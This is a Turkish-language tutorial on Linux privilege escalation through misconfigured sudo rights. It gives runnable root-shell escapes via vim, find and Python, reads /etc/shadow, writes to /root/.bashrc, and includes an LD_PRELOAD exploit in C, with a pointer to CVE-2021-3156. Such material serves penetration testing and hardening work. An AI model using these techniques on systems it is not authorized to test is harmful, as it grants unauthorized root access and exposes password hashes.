### Sudo Haklarını Kötüye Kullanarak Privilege Escalation (Yetki Yükseltme) Rehberi

Sudo, Linux sistemlerinde kullanıcıların belirli komutları root yetkisiyle çalıştırmasına izin veren bir araçtır. Ancak, yanlış yapılandırılmış sudo ayarları, yetki yükseltme saldırıları için fırsatlar sunabilir. Bu rehberde, sudo haklarını kötüye kullanarak nasıl yetki yükseltme yapılacağını adım adım açıklayacağız.

---

#### 1. **Sudo Hakkı Kontrolü**
Sistem üzerinde sudo hakkı olan kullanıcıların hangi komutları çalıştırabildiğini öğrenmek için şu komut kullanılır:
```bash
sudo -l
```
Bu komut, mevcut kullanıcı için sudo ile çalıştırılabilecek komutları ve bu komutların sınırlamalarını listeler. Örnek çıktı:
```
User ahmet may run the following commands on host:
    (ALL) NOPASSWD: /bin/cat
    (root) NOPASSWD: /usr/bin/vim
```

**Analiz Edilecekler:**
- Hangi kullanıcı ya da grup için izin verilmiş?
- Komutların tam yolu doğru mu?
- `NOPASSWD` kullanılmış mı?

---

#### 2. **Potansiyel İstismar Alanları**

##### a) **Komut Çalıştırma Yetkisi**
Sudo ile çalıştırılabilecek bir komutun shell komutlarını icra edebilecek şekilde yapılandırıldığını fark ederseniz, root yetkisi kazanabilirsiniz. Örneğin:
```bash
sudo vim -c ':!/bin/bash'
```
Bu komut, root yetkisiyle bir bash shell açar.

##### b) **Dosya Okuma/Yazma Yetkisi**
Sudo ile root yetkisiyle dosya okuma izni varsa hassas dosyalara erişilebilir:
```bash
sudo cat /etc/shadow
```
Eğer dosya yazma yetkisi varsa, kötü amaçlı kod eklenebilir:
```bash
echo 'malicious_code' | sudo tee /root/.bashrc
```

##### c) **Script ve Program Çalıştırma Yetkisi**
Eğer bir script ya da program root yetkisiyle çalıştırılıyorsa, bu dosya düzenlenerek kötü niyetli komutlar eklenebilir. Örneğin:
```bash
sudo /usr/bin/python3
```
Bu, bir Python shell’i açar:
```python
import os
os.system("/bin/bash")
```

---

#### 3. **Yetki Yükseltme Teknikleri**

##### a) **Sudo’ya Tanımlı İkili Dosyaların İstismarı**
Birçok Linux dağıtımında kurulu olan ikili dosyalar, sudo ile root olarak çalıştırılabilir. GTFOBins (https://gtfobins.github.io) bu tür dosyaların bir listesini sağlar.

**Örnek:**
```bash
sudo find . -exec /bin/sh \; -quit
```
Bu, root yetkisiyle bir shell açar.

##### b) **Çevre Değişkenlerinin İstismarı**
Bazı durumlarda, sudo komutları çevre değişkenlerini miras alır. `LD_PRELOAD` gibi değişkenler kullanılarak root yetkisi elde edilebilir.

**Adımlar:**
1. Kötü amaçlı bir .so dosyası oluşturun:
    ```c
    #include <stdio.h>
    #include <stdlib.h>

    void _init() {
        setgid(0);
        setuid(0);
        system("/bin/bash");
    }
    ```
    Bu dosyayı `gcc -shared -o exploit.so -fPIC exploit.c` ile derleyin.

2. `LD_PRELOAD` değişkenini kullanarak shell açın:
    ```bash
    sudo LD_PRELOAD=./exploit.so some_command
    ```

##### c) **Sudo Hatası Kullanımı**
Bazı sudo sürümleri, belirli zafiyetlere sahiptir. Sürümünüzü kontrol edin:
```bash
sudo --version
```
Örnek bir zafiyet: CVE-2021-3156 (Heap Overflow). Bu tür zafiyetler için güvenlik açıklarını arayın ve exploit’leri uygulayın.

---
